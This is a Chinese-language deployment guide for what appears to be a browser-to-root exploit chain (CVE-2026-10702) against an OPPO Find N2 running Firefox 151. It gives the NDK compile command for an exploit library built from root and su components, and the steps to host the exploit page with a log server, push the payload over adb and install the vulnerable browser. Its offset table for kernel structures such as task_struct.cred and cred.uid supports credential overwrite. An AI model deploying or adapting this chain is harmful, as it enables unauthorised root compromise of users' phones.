# 环境搭建与部署文档

## 依赖清单

### 硬件要求

| 组件 | 要求 |
|------|------|
| 开发机 | macOS 12+ 或 Linux x86_64 |
| 编译服务器 | Ubuntu 20.04+ (推荐) |
| 目标设备 | OPPO Find N2 (CPH2413/PGU110) |
| USB 连接 | USB-C 数据线 |

### 软件依赖

| 工具 | 版本 | 用途 | 安装方式 |
|------|------|------|----------|
| Android NDK | r29 | 交叉编译 exploit | `brew install --cask android-ndk` |
| Python | 3.8+ | 服务器脚本 | 系统自带 |
| adb | 37.0.0+ | Android 调试 | `brew install android-platform-tools` |
| gcc | 11.x | 内核编译 | `apt install gcc-11` |
| aarch64-linux-gnu-gcc | 11.x | ARM64 交叉编译 | `apt install gcc-aarch64-linux-gnu` |
| pahole | 1.25+ | 结构体偏移提取 | `apt install dwarves` |
| Firefox | 151.0 | exploit 目标 | 从 archive.mozilla.org 下载 |

## 本地开发环境搭建

### macOS 开发机

```bash
# 1. 安装 Homebrew (如果未安装)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# 2. 安装 Android NDK
brew install --cask android-ndk

# 3. 安装 ADB
brew install android-platform-tools

# 4. 安装 Python (通常已预装)
python3 --version

# 5. 验证安装
$NDK_PATH/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang --version
adb version
```

### Linux 编译服务器 (可选)

```bash
# 1. 安装编译工具
sudo apt update
sudo apt install -y gcc-11 make flex bison libssl-dev bc libelf-dev \
  dwarves gcc-aarch64-linux-gnu git wget unzip python3

# 2. 验证工具
gcc-11 --version
aarch64-linux-gnu-gcc --version
pahole --version

# 3. 下载内核源码
cd ~
wget https://github.com/oppo-source/android_kernel_oppo_sm8475/archive/refs/heads/oppo/sm8475_b_16.0.0_find_n2.zip
unzip android_kernel_oppo_sm8475-*.zip

# 4. 下载模块和设备树
wget https://github.com/oppo-source/android_kernel_modules_and_devicetree_oppo_sm8475/archive/refs/heads/oppo/sm8475_b_16.0.0_find_n2.zip
unzip android_kernel_modules_and_devicetree_oppo_sm8475-*.zip

# 5. 复制 vendor/o 到内核源码
cp -r android_kernel_modules_and_devicetree_oppo_sm8475-*/vendor/oplus \
  android_kernel_oppo_sm8475-*/vendor/
```

## 编译 Exploit

### 使用 NDK 编译 (macOS)

```bash
cd oppo-ghostlock-upload

# 设置 NDK 路径
NDK=~/Library/Android/android-ndk-r29
# 或 NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK

# 编译 preload.so
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang \
  --target=aarch64-linux-android35 \
  --sysroot=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/sysroot \
  -I. \
  -O2 -fPIC -shared \
  -DTARGET_CONFIG_H="exploit/targets/oppo-find_n2/target.h" \
  exploit/src/main.c exploit/src/util.c exploit/src/slide.c \
  exploit/src/fops.c exploit/src/pipe.c exploit/src/root.c \
  exploit/src/preload.c exploit/src/su_blob.S exploit/src/wallpaper_blob.S \
  -pthread -o preload.so

# 验证编译结果
file preload.so
ls -lh preload.so
```

## 部署与运行

### 启动 Exploit 服务器

```bash
# 1. 启动 exploit HTTP 服务器
cd exploit-server
nohup python3 -m http.server 8080 > /tmp/server.log 2>&1 &

# 2. 启动日志服务器
nohup python3 log_server.py > /tmp/log_server.log 2>&1 &

# 3. 验证服务器
curl -s http://localhost:8080/CVE-2026-10702/ | head -3
curl -s http://localhost:8081/ | head -3
```

### 推送 Exploit 到手机

```bash
# 1. 检查设备连接
adb devices

# 2. 推送 preload.so
adb push preload.so /data/local/tmp/

# 3. 设置权限
adb shell chmod 755 /data/local/tmp/preload.so
```

### 安装 Firefox 151

```bash
# 1. 下载 Firefox 151
curl -L -o fenix-151.0.apk \
  "https://archive.mozilla.org/pub/fenix/releases/151.0/android/fenix-151.0-android-arm64-v8a/fenix-151.0.multi.android-arm64-v8a.apk"

# 2. 卸载旧版本 (如果需要)
adb uninstall org.mozilla.firefox

# 3. 安装 Firefox 151
adb install fenix-151.0.apk

# 4. 验证版本
adb shell dumpsys package org.mozilla.firefox | grep versionName
```

### 运行 Exploit

```bash
# 1. 获取手机 IP
adb shell ip addr show wlan0 | grep inet

# 2. 获取开发机 IP
ifconfig en0 | grep inet

# 3. 在手机 Firefox 中访问
# http://<开发机IP>:8080/CVE-2026-10702/

# 4. 查看实时日志
# http://<开发机IP>:8081
```

## 配置项全解

### target.h 偏移配置

| 配置项 | 值 | 来源 | 说明 |
|--------|-----|------|------|
| KIMAGE_TEXT_BASE | 0xffffffc0080000a0 | boot.img | 内核镜像基地址 |
| INIT_TASK_OFF | 0x027cbf60 | pahole | init_task 偏移 |
| ROOT_TASK_GROUP_OFF | 0x029c7fa0 | pahole | root_task_group 偏移 |
| TASK_MM_OFF | 0x518 | pahole | task_struct.mm 偏移 |
| TASK_CRED_OFF | 0x780 | pahole | task_struct.cred 偏移 |
| CRED_UID_OFF | 4 | pahole | cred.uid 偏移 |
| MM_STRUCT_SZ | 0x3c0 | pahole | mm_struct 大小 (960 bytes) |
| MM_ORDER | 3 | SLUB | slab order (32KB) |

### common.h 配置

| 配置项 | 值 | 说明 |
|--------|-----|------|
| MM_STRUCT_SZ | 0x3c0 | mm_struct 大小 |
| MM_ORDER | 3 | SLUB slab order |
| KSNITCH_COLLISIONS | 4 | KernelSnitch 碰撞数 |
| ORDER3_SIZE | 0x8000 | slab 大小 (32KB) |

## 升级与回滚

### 升级步骤

```bash
# 1. 备份当前配置
cp exploit/targets/oppo-find_n2/target.h target.h.bak

# 2. 拉取最新代码
git pull origin main

# 3. 重新编译
NDK=~/Library/Android/android-ndk-r29
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang \
  ... (编译命令) ...

# 4. 重新部署
adb push preload.so /data/local/tmp/
```

### 回滚方案

```bash
# 恢复备份的配置
cp target.h.bak exploit/targets/oppo-find_n2/target.h

# 重新编译
NDK=~/Library/Android/android-ndk-r29
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang \
  ... (编译命令) ...
```

> [!WARNING]
> 偏移配置与内核版本绑定，不同内核版本的偏移不同，不能混用。
